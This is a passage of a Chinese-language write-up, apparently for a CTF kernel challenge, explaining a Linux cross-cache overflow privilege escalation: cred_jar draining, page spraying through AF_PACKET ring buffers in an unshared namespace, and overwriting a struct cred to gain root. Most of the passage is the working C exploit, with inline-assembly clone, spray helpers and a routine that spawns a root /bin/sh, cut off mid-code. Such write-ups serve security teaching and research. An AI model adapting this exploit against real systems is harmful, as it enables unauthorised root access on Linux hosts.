<li>利用 <code>packet_setsockopt()</code>函数来大量堆喷 <code>order_0</code>的block，并且在每两个分配的pages当中释放其中一个，这样一来我们就拥有了很多 <code>order_0</code>的对象，并且他不会合并到 <code>order_1</code>当中去。而我们最初的exploit是使用fork来开辟一个新的特权用户空间从而使得我们可以在其中使用这些页级分配原语</li>
<li>然后我们大量使用 <code>clone</code>，并且搭配上面说到的flag参数来分配我们的 <code>cred</code>objects,然后我们释放剩余的 <code>order_0</code>pages,然后我们再次大量堆喷我们的易受攻击的对象，这里会构造出一种我们的 <code>vuln objects</code>所在的page是刚好位于我们某个 <code>cred</code>page的上方</li>
</ol>
<h4 id="Step-I-前期准备"><a href="#Step-I-前期准备" class="headerlink" title="Step I: 前期准备"></a>Step I: 前期准备</h4><p>我们之前分析页级分配原语的时候已经说明，在root的命名空间下我们是无法使用该原语的，所以我们需要开辟一个子进程，然后利用 <code>unshare</code>系统调用来创建一个新的子命名空间并应用到子进程当中，这样我们能保证新创建的子进程是可以使用该页级分配系统原语的</p>
<p>而至于我们页级堆喷的方式，那就是使用管道，让父子进程之间通信，然后传递命令和结果，其中该子进程充当一个中间命令管理的作用</p>
<h4 id="Step-II-排干cred-jar"><a href="#Step-II-排干cred-jar" class="headerlink" title="Step II: 排干cred_jar"></a>Step II: 排干cred_jar</h4><p>这里排空他是为了后面我们可以调用fork 来从buddy system获取空页面，但这里的fork并不是fork函数，而是使用了更为精妙的 <code>clone</code>系统调用，他与fork函数的作用基本一致，但是他能实现更为细致的操作，就比如说分配标志的选则</p>
<h4 id="Step-III-堆喷大量page"><a href="#Step-III-堆喷大量page" class="headerlink" title="Step III: 堆喷大量page"></a>Step III: 堆喷大量page</h4><p>这里我们就可以利用之前创建的管理页级堆喷的子进程使用setsockopt来大量堆喷单页面，这里需要注意 <strong>我们需要提权的命名空间为原本的root命名空间，而我们创建的管理子进程是处于自己的命名空间的，所以我们之后堆喷的victim obj，也就是cred是需要在重新分配的子进程（若没经过设置，他同父进程一样处于root命名空间）当中，这样才可以真正修改某个子进程在root命名空间下的权限</strong>，这样我们就可以使得高order的页面均被拆分并且分配，然后我们，然后我们这里仅仅释放每两个页面中的后一页，这里为什么能够保证我们页面都是顺序分配的呢，那是因为我们从伙伴系统高阶拆分的页面在这里会是物理连续的，所以造成了我们基本上可以构造成下面这种情况</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/3ac79f3df8dcd100e7f3ed15348b4710b9122f92.jpg" srcset="/img/loading.gif" lazyload></p>
<h4 id="Step-IV-分配victim-page"><a href="#Step-IV-分配victim-page" class="headerlink" title="Step IV: 分配victim page"></a>Step IV: 分配victim page</h4><p>这里的victim struct我们选则了上面讲到的 <code>struct cred</code>，这里我们只需要覆盖 <code>cred.usage</code>字段为1即可进行提权，这里是一个位于 <code>struct cred</code>的开头4字节的字段，满足我们溢出6字节的漏洞，</p>
<p>这里存在一定的噪声，也就是额外的4个 <code>order_0</code>页面</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/b812c8fcc3cec3fd996eb2419088d43f879427b5.jpg" srcset="/img/loading.gif" lazyload></p>
<h4 id="Step-V-分配vulnerable-obj"><a href="#Step-V-分配vulnerable-obj" class="headerlink" title="Step V: 分配vulnerable obj"></a>Step V: 分配vulnerable obj</h4><p>也就是释放咱们上面的红色快，这里是为了分配之后咱们的<code>vulnerable ojbect</code>,情况如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/8326cffc1e178a8225966a94b003738da977e858.jpg" srcset="/img/loading.gif" lazyload></p>
<p>这样就造成了我们的 <code>cross cache overflow</code>，然后我们在大量越界写的过程当中就会写入我们某个子进程 <code>cred</code>的头六个字节，四字节的1和二字节的0，这里两字节不多不少刚好覆盖原本的 <code>0x3E8</code></p>
<p>效果如下：</p>
<p><img src="http://imgsrc.baidu.com/forum/pic/item/ca1349540923dd546abeb25c9709b3de9c824830.jpg" srcset="/img/loading.gif" lazyload></p>
<p>最终exp如下：</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:0x%lx\n&quot;</span>, str, x)</span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span></span>&#123;<br>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span></span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[-]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ALLOC 0xcafebabe</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELETE 0xdeadbabe</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EDIT 0xf00dbabe</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CLONE_FLAGS CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span><br>&#123;<br>    <span class="hljs-type">int64_t</span> idx;<br>    <span class="hljs-type">uint64_t</span> size;<br>    <span class="hljs-type">char</span> *buf;<br>&#125;<span class="hljs-type">user_req_t</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">tpacket_req</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>&#125;;<br><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">tpacket_versions</span> &#123;<br>    TPACKET_V1,<br>    TPACKET_V2,<br>    TPACKET_V3,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_VERSION 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_TX_RING 13</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FORK_SPRAY 320</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNK_SIZE 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ISO_SLAB_LIMIT 8</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CRED_JAR_INITIAL_SPRAY 32</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INITIAL_PAGE_SPRAY 1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FINAL_PAGE_SPRAY 30</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span><br>&#123;<br>    <span class="hljs-type">bool</span> in_use;<br>    <span class="hljs-type">int</span> idx[ISO_SLAB_LIMIT];<br>&#125;full_page;<br><br><span class="hljs-keyword">enum</span> <span class="hljs-title class_">spray_cmd</span> &#123;<br>    ALLOC_PAGE,<br>    FREE_PAGE,<br>    EXIT_SPRAY,<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span><br>&#123;<br>    <span class="hljs-keyword">enum</span> <span class="hljs-title class_">spray_cmd</span> cmd;<br>    <span class="hljs-type">int32_t</span> idx;<br>&#125;<span class="hljs-type">ipc_req_t</span>;<br><br><span class="hljs-comment">/* Finally spray vulnurbility pages */</span><br>full_page isolation_pages[FINAL_PAGE_SPRAY] = &#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-type">int</span> rootfd[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> sprayfd_child[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> sprayfd_parent[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> socketfds[INITIAL_PAGE_SPRAY];<br><br><span class="hljs-function"><span class="hljs-type">int64_t</span> <span class="hljs-title">ioctl</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> request, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> param)</span></span>&#123;<br>    <span class="hljs-type">long</span> result = <span class="hljs-built_in">syscall</span>(<span class="hljs-number">16</span>, fd, request, param);<br>    <span class="hljs-keyword">if</span>(result &lt; <span class="hljs-number">0</span>)<br>        <span class="hljs-built_in">perror</span>(<span class="hljs-string">&quot;ioctl on driver&quot;</span>);<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int64_t</span> <span class="hljs-title">alloc</span><span class="hljs-params">(<span class="hljs-type">int</span> fd)</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">ioctl</span>(fd, ALLOC, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int64_t</span> <span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">int64_t</span> idx, <span class="hljs-type">uint64_t</span> size, <span class="hljs-type">char</span>* buf)</span></span>&#123;<br>    <span class="hljs-type">user_req_t</span> req = &#123;.idx = idx, .size = size, .buf = buf&#125;;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">ioctl</span>(fd, EDIT, (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)&amp;req);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&lt;STAR PLATINUM, THE WORLD!&gt;&quot;</span>);<br>    <span class="hljs-built_in">getchar</span>();<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">unshare_setup</span><span class="hljs-params">(<span class="hljs-type">uid_t</span> uid, <span class="hljs-type">gid_t</span> gid)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> temp;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-built_in">unshare</span>(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);     <span class="hljs-comment">//Create new namespace and get in</span><br>    temp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">write</span>(temp, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    <span class="hljs-built_in">close</span>(temp);<br>    temp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-built_in">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, uid);<br>    <span class="hljs-built_in">write</span>(temp, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    <span class="hljs-built_in">close</span>(temp);<br>    temp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-built_in">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, gid);<br>    <span class="hljs-built_in">write</span>(temp, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    <span class="hljs-built_in">close</span>(temp);<br>    <span class="hljs-keyword">return</span>;<br>&#125;<br><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * __clone - clone syscall in /kernel/fork.c</span><br><span class="hljs-comment"> * @flags: clone flags</span><br><span class="hljs-comment"> * @dest: the ptr of the user_stack</span><br><span class="hljs-comment"> * */</span><br>__attribute__((naked)) <span class="hljs-type">pid_t</span> __clone(<span class="hljs-type">uint64_t</span> flags, <span class="hljs-type">void</span> *dest)<br>&#123;<br>    <span class="hljs-built_in">asm</span>(<span class="hljs-string">&quot;mov r15, rsi;&quot;</span><br>        <span class="hljs-string">&quot;xor rsi, rsi;&quot;</span><br>        <span class="hljs-string">&quot;xor rdx, rdx;&quot;</span><br>        <span class="hljs-string">&quot;xor r10, r10;&quot;</span><br>        <span class="hljs-string">&quot;xor r9, r9;&quot;</span><br>        <span class="hljs-string">&quot;mov rax, 56;&quot;</span><br>        <span class="hljs-string">&quot;syscall;&quot;</span><br>        <span class="hljs-string">&quot;cmp rax, 0;&quot;</span><br>        <span class="hljs-string">&quot;jl bad_end;&quot;</span><br>        <span class="hljs-string">&quot;jg good_end;&quot;</span><br>        <span class="hljs-string">&quot;jmp r15;&quot;</span><br>        <span class="hljs-string">&quot;bad_end:&quot;</span><br>        <span class="hljs-string">&quot;neg rax;&quot;</span><br>        <span class="hljs-string">&quot;ret;&quot;</span><br>        <span class="hljs-string">&quot;good_end:&quot;</span><br>        <span class="hljs-string">&quot;ret;&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">timespec</span> timer = &#123;.tv_sec = <span class="hljs-number">1000000000</span>, .tv_nsec = <span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">char</span> throwaway;<br><span class="hljs-type">char</span> root[] = <span class="hljs-string">&quot;root\n&quot;</span>;<br><span class="hljs-type">char</span> binsh[] = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span>;<br><span class="hljs-type">char</span> *args[] = &#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-literal">NULL</span>&#125;;<br><br>__attribute__((naked)) <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">check_and_wait</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">asm</span>(<br>        <span class="hljs-string">&quot;lea rax, [rootfd];&quot;</span><br>        <span class="hljs-string">&quot;mov edi, dword ptr [rax];&quot;</span><br>        <span class="hljs-string">&quot;lea rsi, [throwaway];&quot;</span><br>        <span class="hljs-string">&quot;mov rdx, 1;&quot;</span><br>        <span class="hljs-string">&quot;xor rax, rax;&quot;</span><br>        <span class="hljs-string">&quot;syscall;&quot;</span>              <span class="hljs-comment">//read(rootfd, throwaway, 1)</span><br>        <span class="hljs-string">&quot;mov rax, 102;&quot;</span>         <br>        <span class="hljs-string">&quot;syscall;&quot;</span>              <span class="hljs-comment">//getuid()</span><br>        <span class="hljs-string">&quot;cmp rax, 0;&quot;</span>           <span class="hljs-comment">// not root, goto finish</span><br>        <span class="hljs-string">&quot;jne finish;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, 1;&quot;</span><br>        <span class="hljs-string">&quot;lea rsi, [root];&quot;</span><br>        <span class="hljs-string">&quot;mov rdx, 5;&quot;</span><br>        <span class="hljs-string">&quot;mov rax, 1;&quot;</span><br>        <span class="hljs-string">&quot;syscall;&quot;</span>              <span class="hljs-comment">//write(1, root, 5)</span><br>        <span class="hljs-string">&quot;lea rdi, [binsh];&quot;</span><br>        <span class="hljs-string">&quot;lea rsi, [args];&quot;</span><br>        <span class="hljs-string">&quot;xor rdx, rdx;&quot;</span><br>        <span class="hljs-string">&quot;mov rax, 59;&quot;</span><br>        <span class="hljs-string">&quot;syscall;&quot;</span>              <span class="hljs-comment">//execve(&quot;/bin/sh&quot;, args, 0)</span><br>        <span class="hljs-string">&quot;finish:&quot;</span><br>        <span class="hljs-string">&quot;lea rdi, [timer];&quot;</span><br>        <span class="hljs-string">&quot;xor rsi, rsi;&quot;</span><br>        <span class="hljs-string">&quot;mov rax, 35;&quot;</span><br>        <span class="hljs-string">&quot;syscall;&quot;</span>              <span class="hljs-comment">//nanosleep()</span><br>        <span class="hljs-string">&quot;ret;&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">just_wait</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-built_in">sleep</span>(<span class="hljs-number">1000000000</span>);<br>&#125;<br><br><span class="hljs-comment">/* *</span><br><span class="hljs-comment"> * alloc_pages_via_sock - page allocation primitive</span><br><span class="hljs-comment"> * @size: once order-* allocation in page level</span><br><span class="hljs-comment"> * @n: the times you want to allocate</span><br><span class="hljs-comment"> * Return: the new socket fd</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">alloc_pages_via_sock</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> size, <span class="hljs-type">uint32_t</span> n)</span></span>&#123;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">tpacket_req</span> req;<br>    <span class="hljs-type">int32_t</span> socketfd, version;<br>    <br>    <span class="hljs-comment">/* Create the AF_PACKET socket */</span><br>    socketfd = <span class="hljs-built_in">socket</span>(AF_PACKET, SOCK_RAW, PF_PACKET);<br>    <span class="hljs-keyword">if</span>(socketfd &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;Create the AF_PACKET socket failed...&quot;</span>);<br>    &#125;<br><br>    version = TPACKET_V1;<br><br>    <span class="hljs-comment">/* Set the ring buffer version */</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">setsockopt</span>(socketfd, SOL_PACKET, PACKET_VERSION, &amp;version, <span class="hljs-built_in">sizeof</span>(version)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;setsocketopt PACKET_VETSION failed...&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">assert</span>(size % <span class="hljs-number">4096</span> == <span class="hljs-number">0</span>);   <span class="hljs-comment">//size must be the 4096x*</span><br>    <br>    <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(req));<br>    req.tp_block_size = size;<br>    req.tp_block_nr = n;<br>    req.tp_frame_size = <span class="hljs-number">4096</span>;<br>    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr)/req.tp_frame_size;<br>    <br>    <span class="hljs-comment">/* Allocate the PACKET_TX_RING type ring buffer */</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">setsockopt</span>(socketfd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-built_in">sizeof</span>(req)) &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">error_log</span>(<span class="hljs-string">&quot;setsocketopt PACKET_TX_RING failed!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">return</span> socketfd;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">spray_comm_handler</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">ipc_req_t</span> req;<br>    <span class="hljs-type">int32_t</span> result;<br><br>    <span class="hljs-keyword">do</span>&#123;<br>        <span class="hljs-built_in">read</span>(sprayfd_child[<span class="hljs-number">0</span>], &amp;req, <span class="hljs-built_in">sizeof</span>(req));<br>        <span class="hljs-built_in">assert</span>(req.idx &lt; INITIAL_PAGE_SPRAY);<br>        <span class="hljs-keyword">if</span>(req.cmd == ALLOC_PAGE)&#123;<br>            socketfds[req.idx] = <span class="hljs-built_in">alloc_pages_via_sock</span>(<span class="hljs-number">4096</span>, <span class="hljs-number">1</span>);<br>        &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (req.cmd == FREE_PAGE)&#123;<br>            <span class="hljs-built_in">close</span>(socketfds[req.idx]);<br>        &#125;<br>        result = req.idx;<br>        <span class="hljs-built_in">write</span>(sprayfd_parent[<span class="hljs-number">1</span>], &amp;result, <span class="hljs-built_in">sizeof</span>(result));<br>    &#125;<span class="hljs-keyword">while</span>(req.cmd != EXIT_SPRAY);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">send_spray_cmd</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> spray_cmd cmd, <span class="hljs-type">int</span> idx)</span></span>&#123;<br>    <span class="hljs-type">ipc_req_t</span> req;<br>    <span class="hljs-type">int32_t</span> result;<br><br>    req.cmd = cmd;<br>    req.idx = idx;<br>    <span class="hljs-comment">/* write to child manager for cmd */</span><br>    <span class="hljs-built_in">write</span>(sprayfd_child[<span class="hljs-number">1</span>], &amp;req, 